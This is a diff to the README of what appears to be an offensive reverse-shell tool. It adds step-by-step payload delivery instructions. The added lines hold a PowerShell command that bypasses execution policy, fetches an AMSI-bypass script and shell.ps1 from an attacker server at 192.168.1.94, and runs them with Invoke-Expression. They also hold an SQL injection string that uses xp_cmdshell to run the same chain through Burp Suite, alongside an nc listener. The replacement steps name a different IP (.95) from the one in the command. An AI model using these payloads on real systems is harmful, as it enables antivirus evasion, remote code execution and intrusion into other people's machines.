@@ -53,13 +53,29 @@ rlwrap -cAr nc -lvp 443
 ```
 
 ### 3. Execute the Payload
-On the target machine, run the following command in PowerShell or CMD:
+
+#### **From the Target Machine (CMD)**:
+On the target machine, run the following command in CMD:
 
 ```cmd
-powershell -ExecutionPolicy Bypass -NoProfile -Command "Invoke-Expression (Invoke-WebRequest -Uri 'http://<SERVER_IP>:8000/amsi.txt' -UseBasicParsing | Select-Object -ExpandProperty Content); $scriptContent = [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri 'http://<SERVER_IP>:8000/shell.ps1' -UseBasicParsing).Content); Invoke-Expression $scriptContent"
+powershell -ExecutionPolicy Bypass -NoProfile -Command "Invoke-Expression (Invoke-WebRequest -Uri 'http://192.168.1.94/amsi.txt' -UseBasicParsing | Select-Object -ExpandProperty Content); $scriptContent = [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri 'http://192.168.1.94/shell.ps1' -UseBasicParsing).Content); Invoke-Expression $scriptContent"
 ```
 
-Replace `<SERVER_IP>` with the IP address of your HTTP server.
+Replace `192.168.1.94` with the IP address of your HTTP server.
+
+---
+
+#### **From an SQL Injection (Burp Suite)**:
+If you have an SQL Injection vulnerability where you can execute commands using `xp_cmdshell`, run the following command from Burp Suite:
+
+```sql
+parameter=test'; EXEC xp_cmdshell 'powershell IEX (Invoke-WebRequest -Uri \"http://192.168.1.94/amsi.txt\" -UseBasicParsing).RawContent ; $scriptContent = [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri \"http://192.168.1.94/shell.ps1\" -UseBasicParsing).Content); Invoke-Expression $scriptContent';--
+```
+
+**Steps**:
+1. Replace `http://192.168.1.95` with the IP address of your HTTP server.
+2. Convert the command to URL encoding using **Ctrl + U** in Burp Suite.
+3. Send the request to execute the payload.
 
 ---
 
